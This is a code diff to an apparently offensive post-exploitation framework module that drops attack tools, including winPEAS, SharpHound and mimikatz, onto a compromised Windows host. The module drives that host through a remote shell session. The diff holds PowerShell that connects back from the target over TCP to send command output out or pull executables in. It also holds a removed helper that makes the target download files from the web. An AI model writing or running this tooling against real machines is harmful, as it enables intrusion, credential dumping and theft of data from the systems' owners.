@@ -2,15 +2,14 @@ from __future__ import annotations
 
 import re
 import select
-import socket
 import tempfile
-import threading
 import time
 import urllib.request
 import uuid
 import zipfile
 
 from koi.modules.blueprint import KoiModule
+from koi.utils.tcp import get_local_ip, spawn_send_server, spawn_recv_server
 
 _PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
 
@@ -23,8 +22,6 @@ TOOLS: dict[str, str] = {
     "winPEAS.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/winPEAS.exe",
     "SharpHound.ps1":  "https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1",
 }
-
-MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
 
 
 class PopulateWinModule(KoiModule):
@@ -91,13 +88,8 @@ class PopulateWinModule(KoiModule):
 
     def _win_query_sidechannel(self, ps_expr: str, timeout: float = 60.0) -> str:
         """Variant for upgraded (ConPtyShell) sessions — result returned via side TCP socket."""
-        local_ip = self._get_local_ip()
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind(("0.0.0.0", 0))
-        srv.listen(1)
-        srv.settimeout(timeout)
-        port = srv.getsockname()[1]
+        local_ip = get_local_ip(self.session.addr[0])
+        port, collect = spawn_recv_server(timeout=timeout)
 
         ps_cmd = (
             f"$_r=({ps_expr})|Out-String;"
@@ -108,47 +100,12 @@ class PopulateWinModule(KoiModule):
             f"$_s.Flush();$_c.Close()"
         )
         self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
+        return collect().decode("utf-8", errors="replace").strip()
 
-        try:
-            conn, _ = srv.accept()
-            data = b""
-            while chunk := conn.recv(4096):
-                data += chunk
-            conn.close()
-            return data.decode("utf-8", errors="replace").strip()
-        except socket.timeout:
-            return ""
-        finally:
-            srv.close()
-
-    def _get_local_ip(self) -> str:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            s.connect((self.session.addr[0], 80))
-            return s.getsockname()[0]
-        finally:
-            s.close()
-
-    def _download_tool(self, name: str, url: str, dest: str) -> bool:
-        """Download *url* to *dest* on the remote target. Returns True on success."""
-        ps = f"(New-Object Net.WebClient).DownloadFile('{url}','{dest}')"
-
-        if self.session.upgraded:
-            self.session.conn.sendall((ps + "\r\n").encode(self.session.encoding))
-            time.sleep(0.3)
-            r, _, _ = select.select([self.session.conn], [], [], 1.0)
-            if r:
-                self.session.conn.recv(4096)
-        elif self.session.os_type == "windows_ps":
-            self.sendline(ps)
-        else:
-            escaped = ps.replace('"', '\\"')
-            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')
-
-        time.sleep(2.0)
-
-        check = self._win_query(f"(Test-Path '{dest}').ToString()")
-        return check.strip().lower() == "true"
+    def _fetch_url(self, url: str) -> bytes:
+        """Download *url* locally and return its raw bytes."""
+        with urllib.request.urlopen(url, timeout=30) as resp:
+            return resp.read()
 
     def _fetch_mimikatz_exe(self) -> bytes:
         """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
@@ -164,34 +121,8 @@ class PopulateWinModule(KoiModule):
 
     def _upload_exe(self, raw: bytes, dest: str) -> bool:
         """Upload raw bytes to *dest* on the target via a side TCP connection."""
-        local_ip = self._get_local_ip()
-        total    = len(raw)
-
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind(("0.0.0.0", 0))
-        srv.listen(1)
-        srv.settimeout(30)
-        port = srv.getsockname()[1]
-
-        error: list[str] = []
-
-        def _send():
-            try:
-                conn, _ = srv.accept()
-                sent = 0
-                while sent < total:
-                    chunk = raw[sent: sent + 65536]
-                    conn.sendall(chunk)
-                    sent += len(chunk)
-                conn.close()
-            except Exception as exc:
-                error.append(str(exc))
-            finally:
-                srv.close()
-
-        t = threading.Thread(target=_send, daemon=True)
-        t.start()
+        local_ip = get_local_ip(self.session.addr[0])
+        port, thread, errors = spawn_send_server(raw, timeout=30)
 
         ps_cmd = (
             f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
@@ -214,9 +145,9 @@ class PopulateWinModule(KoiModule):
             escaped = ps_cmd.replace('"', '\\"')
             self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')
 
-        t.join(timeout=30)
+        thread.join(timeout=30)
 
-        if error:
+        if errors:
             return False
 
         time.sleep(1.0)
@@ -233,9 +164,10 @@ class PopulateWinModule(KoiModule):
 
         for name, url in TOOLS.items():
             dest = f"{out_dir}\\{name}"
-            with self.spinner(f"Downloading {name}…"):
+            with self.spinner(f"Fetching and uploading {name}…"):
                 try:
-                    ok = self._download_tool(name, url, dest)
+                    raw = self._fetch_url(url)
+                    ok  = self._upload_exe(raw, dest)
                 except Exception as exc:
                     ok = False
                     results[name] = f"error: {exc}"
@@ -243,7 +175,7 @@ class PopulateWinModule(KoiModule):
             results[name] = dest if ok else "FAILED"
 
         dest = f"{out_dir}\\mimikatz.exe"
-        with self.spinner("Downloading mimikatz locally and uploading…"):
+        with self.spinner("Downloading mimikatz…"):
             try:
                 raw = self._fetch_mimikatz_exe()
                 ok  = self._upload_exe(raw, dest)
